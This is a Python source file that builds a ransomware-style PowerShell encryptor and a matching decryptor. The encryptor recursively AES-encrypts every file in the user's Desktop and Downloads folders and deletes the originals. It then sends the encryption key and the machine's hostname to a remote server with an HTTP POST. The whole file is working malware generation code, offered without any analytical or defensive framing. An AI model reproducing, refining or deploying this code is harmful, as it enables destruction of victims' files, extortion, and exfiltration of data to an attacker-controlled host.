import socket
import argparse
import os

# -------------------------------------------------------------------------------------
# Function to get the local machine's IP address
# -------------------------------------------------------------------------------------
def get_local_ip():
    try:
        # Create a temporary socket connection to determine the local IP
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))  # Google's public DNS server
            ip = s.getsockname()[0]
        return ip
    except Exception:
        return "127.0.0.1"  # Fallback to localhost if unable to determine IP

# -------------------------------------------------------------------------------------
# Function to generate the encryptor script
# -------------------------------------------------------------------------------------
def generate_encryptor_script(server_ip):
    """
    Returns a string containing the PowerShell code for file encryption,
    including a custom file-hash function to avoid relying on the built-in Get-FileHash cmdlet.
    """
    encryptor_script = f"""
# -------------------------------------------
# Define the AES-256 encryption key (hardcoded)
# -------------------------------------------
$key = "12345678901234567890123456789012"  # 32 bytes (256 bits)

# Convert the key to a byte array
$keyBytes = [System.Text.Encoding]::UTF8.GetBytes($key)

# Define the folders to encrypt
$foldersToEncrypt = @("$env:USERPROFILE\\Desktop", "$env:USERPROFILE\\Downloads")

# Log file path
$logFilePath = "$env:USERPROFILE\\Desktop\\encryption_log.txt"

# ---------------------------------------------------------------
# Custom file-hash function using .NET instead of Get-FileHash
# ---------------------------------------------------------------
function Get-FileHashCustom {{
    param (
        [string]$filePath
    )
    if (Test-Path $filePath) {{
        try {{
            $stream = [System.IO.File]::OpenRead($filePath)
            $sha256 = [System.Security.Cryptography.SHA256]::Create()
            $hashBytes = $sha256.ComputeHash($stream)
            $stream.Close()
            # Convert from byte[] to a readable hex string
            return ($hashBytes | ForEach-Object ToString x2) -join ''
        }} catch {{
            Write-Host "Failed to calculate hash for: $filePath"
            return "N/A"
        }}
    }} else {{
        Write-Host "Path not found: $filePath"
        return "N/A"
    }}
}}

# ------------------------------------------
# Function to encrypt a single file
# ------------------------------------------
function Encrypt-File {{
    param (
        [string]$filePath,
        [byte[]]$key
    )
    try {{
        # Skip already encrypted files
        if ($filePath.EndsWith('.secured')) {{
            Write-Host "Skipping already encrypted file: $filePath"
            return
        }}

        # Check if the file exists
        if (-not (Test-Path $filePath)) {{
            Write-Host "File not found: $filePath"
            return
        }}

        Write-Host "Starting encryption for: $filePath"

        # Generate a random initialization vector (IV)
        $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
        $aes.Key = $key
        $aes.GenerateIV()
        $iv = $aes.IV

        # Read the file content
        $fileContent = Get-Content -Path $filePath -Encoding Byte -ErrorAction Stop

        # Calculate hash before encryption using our custom function
        $preEncryptionHash = Get-FileHashCustom -filePath $filePath

        # Encrypt the file content
        $encryptor = $aes.CreateEncryptor()
        $encryptedContent = $encryptor.TransformFinalBlock($fileContent, 0, $fileContent.Length)

        # Prepare output (IV + encrypted bytes)
        $outputContent = $iv + $encryptedContent
        $outputFilePath = "$filePath.secured"
        [System.IO.File]::WriteAllBytes($outputFilePath, $outputContent)

        # Remove the original file
        Remove-Item -Path $filePath -Force -ErrorAction Stop

        # Calculate hash after encryption
        $postEncryptionHash = Get-FileHashCustom -filePath $outputFilePath

        # Log the file details
        Add-Content -Path $logFilePath -Value "File: $filePath"
        Add-Content -Path $logFilePath -Value "Pre-Encryption Hash: $preEncryptionHash"
        Add-Content -Path $logFilePath -Value "Post-Encryption Hash: $postEncryptionHash"
        Add-Content -Path $logFilePath -Value ""

        Write-Host "Encrypted and renamed: $outputFilePath"
    }} catch {{
        Write-Host "Failed to encrypt: $filePath"
        Write-Host "Error: $_"
    }}
}}

# -------------------------------
# Encrypt files in target folders
# -------------------------------
foreach ($folder in $foldersToEncrypt) {{
    if (Test-Path $folder) {{
        Get-ChildItem -Path $folder -Recurse -File | Where-Object {{ !$_.Name.EndsWith('.secured') }} | ForEach-Object {{
            Encrypt-File -filePath $_.FullName -key $keyBytes
        }}
    }} else {{
        Write-Host "Folder not found: $folder"
    }}
}}

# ------------------------------------------------------------------------
# Send the encryption key and hostname to the remote Python web server
# ------------------------------------------------------------------------
try {{
    $hostname = $env:COMPUTERNAME
    $url = "http://{server_ip}:8000/store_key"  # Auto-generated // Adjust as needed for quick testing
    $body = @{{
        key = $key
        hostname = $hostname
    }} | ConvertTo-Json

    Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "application/json"
    Write-Host "Encryption key and hostname sent to remote server."
}} catch {{
    Write-Host "Failed to send encryption key and hostname to remote server."
    Write-Host "Error: $_"
}}
"""
    return encryptor_script

# -------------------------------------------------------------------------------------
# Function to generate the decryptor script
# (No built-in Get-FileHash usage here, so no changes needed.)
# -------------------------------------------------------------------------------------
def generate_decryptor_script():
    """
    Returns a string containing the PowerShell code for file decryption.
    """
    decryptor_script = r"""
# Define the AES-256 encryption key (hardcoded)
$key = "12345678901234567890123456789012"  # 32 bytes (256 bits) // Change key here if needed

# Convert the key to a byte array
$keyBytes = [System.Text.Encoding]::UTF8.GetBytes($key)

# Define the folders to decrypt
$foldersToDecrypt = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads")

# Function to decrypt a file
function Decrypt-File {
    param (
        [string]$filePath,
        [byte[]]$key
    )
    try {
        # Read the file content
        $fileContent = Get-Content -Path $filePath -Encoding Byte

        # Extract the IV (first 16 bytes)
        $iv = $fileContent[0..15]
        $encryptedContent = $fileContent[16..($fileContent.Length - 1)]

        # Decrypt the file content
        $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
        $aes.Key = $key
        $aes.IV = $iv
        $decryptor = $aes.CreateDecryptor()
        $decryptedContent = $decryptor.TransformFinalBlock($encryptedContent, 0, $encryptedContent.Length)

        # Write the decrypted content back to the file
        $outputFilePath = $filePath -replace '\.secured$', ''
        [System.IO.File]::WriteAllBytes($outputFilePath, $decryptedContent)

        # Remove the encrypted file
        Remove-Item -Path $filePath -Force

        Write-Host "Decrypted and renamed: $outputFilePath"
    } catch {
        Write-Host "Failed to decrypt: $filePath"
        Write-Host "Error: $_"
    }
}

# Decrypt all files in the specified folders
foreach ($folder in $foldersToDecrypt) {
    if (Test-Path $folder) {
        Get-ChildItem -Path $folder -Recurse -File | Where-Object { $_.Name.EndsWith('.secured') } | ForEach-Object {
            Decrypt-File -filePath $_.FullName -key $keyBytes
        }
    } else {
        Write-Host "Folder not found: $folder"
    }
}
"""
    return decryptor_script

# -------------------------------------------------------------------------------------
# Main function: Generates both scripts and writes them to files
# -------------------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(description="Generate encryptor and decryptor PowerShell scripts.")
    parser.add_argument("--ip", type=str,
                        help="Manually specify the server IP address. If not provided, the script will detect the local IP automatically.")
    args = parser.parse_args()

    # Determine the server IP address
    if args.ip:
        server_ip = args.ip
        print(f"Using manually provided server IP: {server_ip}")
    else:
        server_ip = get_local_ip()
        print(f"Detected server IP: {server_ip}")

    # Generate the encryptor script (with the custom hashing function)
    encryptor_script = generate_encryptor_script(server_ip)

    # Generate the decryptor script
    decryptor_script = generate_decryptor_script()

    # Save the scripts in the same directory as this Python file
    parent_dir = os.path.dirname(os.path.abspath(__file__))

    encryptor_path = os.path.join(parent_dir, "encryptor.ps1")
    with open(encryptor_path, "w", encoding="utf-8") as encryptor_file:
        encryptor_file.write(encryptor_script)
    print(f"Generated '{encryptor_path}'.")

    decryptor_path = os.path.join(parent_dir, "decryptor.ps1")
    with open(decryptor_path, "w", encoding="utf-8") as decryptor_file:
        decryptor_file.write(decryptor_script)
    print(f"Generated '{decryptor_path}'.")


if __name__ == "__main__":
    main()
